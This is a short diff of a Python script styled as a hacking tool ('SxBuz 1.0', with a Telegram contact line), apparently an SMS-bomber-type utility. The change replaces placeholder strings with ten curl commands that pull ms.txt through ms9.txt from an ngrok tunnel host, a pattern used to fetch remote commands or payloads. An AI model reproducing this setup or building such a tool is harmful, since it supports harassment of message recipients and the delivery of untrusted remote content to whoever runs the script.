@@ -50,16 +50,16 @@ def hero():
     newperiod=period
     banner='figlet SxBuz 1.0|lolcat'
     numbers=[]
-    Commands='curl hacked/ms.txt'
-    Commands1='curl hacked/ms1.txt'
-    Commands2='curl hacked/ms2.txt'
-    Commands3='curl hacked/ms3.txt'
-    Commands4='curl hacked/ms4.txt'
-    Commands5='curl hacked/ms5.txt'
-    Commands6='curl hacked/ms6.txt'
-    Commands7='curl hacked/ms7.txt'
-    Commands8='curl hacked/ms8.txt'
-    Commands9='curl hacked/ms9.txt'
+    Commands='curl http://eaca-103-83-145-180.ngrok.io/ms.txt'
+    Commands1='curl http://eaca-103-83-145-180.ngrok.io/ms1.txt'
+    Commands2='curl http://eaca-103-83-145-180.ngrok.io/ms2.txt'
+    Commands3='curl http://eaca-103-83-145-180.ngrok.io/ms3.txt'
+    Commands4='curl http://eaca-103-83-145-180.ngrok.io/ms4.txt'
+    Commands5='curl http://eaca-103-83-145-180.ngrok.io/ms5.txt'
+    Commands6='curl http://eaca-103-83-145-180.ngrok.io/ms6.txt'
+    Commands7='curl http://eaca-103-83-145-180.ngrok.io/ms7.txt'
+    Commands8='curl http://eaca-103-83-145-180.ngrok.io/ms8.txt'
+    Commands9='curl http://eaca-103-83-145-180.ngrok.io/ms9.txt'
 
     system(banner)
     print(f"{red}Contact me on telegram @smsn_knt")
